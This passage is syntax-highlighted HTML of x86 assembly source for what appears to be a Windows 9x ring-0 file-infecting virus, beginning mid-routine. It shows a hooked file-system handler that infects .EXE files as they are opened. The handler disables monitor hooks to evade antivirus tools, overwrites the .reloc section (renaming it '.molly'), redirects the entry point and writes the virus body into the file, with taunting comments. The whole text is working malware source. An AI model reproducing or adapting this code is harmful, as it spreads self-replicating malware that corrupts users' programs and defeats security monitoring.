        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">tunnel</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">js</span><span class="sc0">      </span><span class="sc5">tunnel</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">top_chain</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">OldFSA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">semaphore</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)],</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">already_installed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">; --- The new FileSystem hook ;)</span><span class="sc0">

</span><span class="sc5">FileSystemHook</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FSD_Func_Address</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Function</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Drive</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,\
</span><span class="sc0">                        </span><span class="sc5">ResourceKind</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">StrCodePage</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PtrIOREQ</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">Function</span><span class="sc4">,</span><span class="sc5">IFSFN_OPEN</span><span class="sc0">             </span><span class="sc1">; File Open? Infect if it is</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infect</span><span class="sc0">

</span><span class="sc5">ExitFileSystemHook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">OldFSA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FSD_Func_Address</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Function</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Drive</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ResourceKind</span><span class="sc4">,</span><span class="sc0"> \
                         </span><span class="sc5">StrCodePage</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PtrIOREQ</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">FileSystemHook</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">r0fio</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc5">VxDJmp</span><span class="sc0">  </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
</span><span class="sc5">R0_FileIO</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">VxDJmp</span><span class="sc0">  </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc5">pe_header_ptr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">top_chain</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">semaphore</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushfd</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r0delta</span><span class="sc0">
</span><span class="sc5">r0delta</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+(</span><span class="sc5">semaphore</span><span class="sc4">-</span><span class="sc5">r0delta</span><span class="sc4">)],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">exit_infect</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+(</span><span class="sc5">semaphore</span><span class="sc4">-</span><span class="sc5">r0delta</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">top_chain</span><span class="sc0"> </span><span class="sc5">rd_</span><span class="sc0">               </span><span class="sc1">; Make null top chain, so we</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; avoid monitors by means of</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; cutting their balls :)</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc5">rd_</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">PtrIOREQ</span><span class="sc0">                    </span><span class="sc1">; ESI = Ptr to IOREQ struc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">esi.2Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; ESI = Ptr to UNI filename</span><span class="sc0">
</span><span class="sc5">uni2asciiz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">                                   </span><span class="sc1">; Convert to ASCIIz</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">uni2asciiz</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; EDI = Ptr to ASCIIz filename</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">05h</span><span class="sc4">],</span><span class="sc3">"EXE."</span><span class="sc0">      </span><span class="sc1">; Infect only EXE files</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">AvoidInfection</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0">      </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc3">"TAOG"</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">AvoidInfection</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; ESI = Ptr to filename</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc4">/</span><span class="sc2">100h</span><span class="sc0">       </span><span class="sc1">; EAX = Function</span><span class="sc0">
                                                </span><span class="sc1">;           GETFILEATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">AvoidInfection</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; EAX = Function</span><span class="sc0">
                                                </span><span class="sc1">;           SETFILEATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; ECX = New attributes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">RestoreAttributes</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc4">/</span><span class="sc2">100h</span><span class="sc0">        </span><span class="sc1">; EAX = Function OPENFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; ECX = 0</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; EDX = 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; EBX = 2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">RestoreAttributes</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; EBX = File handle</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">R0_READFILE</span><span class="sc4">/</span><span class="sc2">100h</span><span class="sc0">             </span><span class="sc1">; EAX = Function READFILE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; ECX = Bytes to read (4)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3Ch</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; EDX = Where to read (3C)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">pe_header_ptr</span><span class="sc0"> </span><span class="sc5">rd</span><span class="sc0">            </span><span class="sc1">; ESI = Where store data</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; EDX = Where to read</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; EAX = Function READFILE</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">pe_header</span><span class="sc0"> </span><span class="sc5">rd</span><span class="sc0">                </span><span class="sc1">; ESI = Where store data</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                          </span><span class="sc1">; ECX = Bytes to read (1K)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">CloseFile</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"M"</span><span class="sc4">-</span><span class="sc3">"O"</span><span class="sc4">+</span><span class="sc3">"L"</span><span class="sc4">-</span><span class="sc3">"L"</span><span class="sc4">+</span><span class="sc3">"Y"</span><span class="sc0">          </span><span class="sc1">; Mark in the PE header</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CloseFile</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Get last section of header</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">74h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; ESI = last section header</span><span class="sc0">
                                                </span><span class="sc1">; EDI = PE header</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">0E0000000h</span><span class="sc0">            </span><span class="sc1">; New sectionz attributes</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0A0h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; Nulify possible .reloc</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0A4h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"ler."</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">CloseFile</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc3">"co"</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">CloseFile</span><span class="sc0">

</span><span class="sc1">; Oh, wtf, OVERWRITE! ;)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"lom."</span><span class="sc0">          </span><span class="sc1">; .reloc -&gt; .molly</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc3">"yl"</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; Clear PointerToRelocations</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; Clear NumberOfRelocations</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Where copy virus</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; VirtualSize -&gt; virus size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">; Align, sucker</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; SizeOfRawData -&gt; aligned</span><span class="sc0">
                                                </span><span class="sc1">;                  virus size</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; New EIP</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Put new EIP and get old one</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">OldEIP</span><span class="sc0"> </span><span class="sc5">rd</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Save it</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">R0_WRITEFILE</span><span class="sc4">/</span><span class="sc2">100h</span><span class="sc0">            </span><span class="sc1">; Write the modified header</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">pe_header_ptr</span><span class="sc0"> </span><span class="sc5">rd</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">pe_header</span><span class="sc0"> </span><span class="sc5">rd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

        </span><span class="sc7">fild</span><span class="sc0">    </span><span class="sc10">real8</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">r0fio</span><span class="sc4">-</span><span class="sc5">r0delta</span><span class="sc4">)]</span><span class="sc0"> </span><span class="sc1">; Fix R0_FileIO VxDJmp...</span><span class="sc0">
        </span><span class="sc7">fistp</span><span class="sc0">   </span><span class="sc10">real8</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">R0_FileIO</span><span class="sc4">-</span><span class="sc5">r0delta</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Write virus</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">virus_start</span><span class="sc0"> </span><span class="sc5">rd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">R0_CLOSEFILE</span><span class="sc4">/</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

</span><span class="sc5">RestoreAttributes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

</span><span class="sc5">AvoidInfection</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">                       </span><span class="sc1">; Restore top chain</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+(</span><span class="sc5">semaphore</span><span class="sc4">-</span><span class="sc5">r0delta</span><span class="sc4">)]</span><span class="sc0">

</span><span class="sc5">exit_infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">popfd</span><span class="sc0">
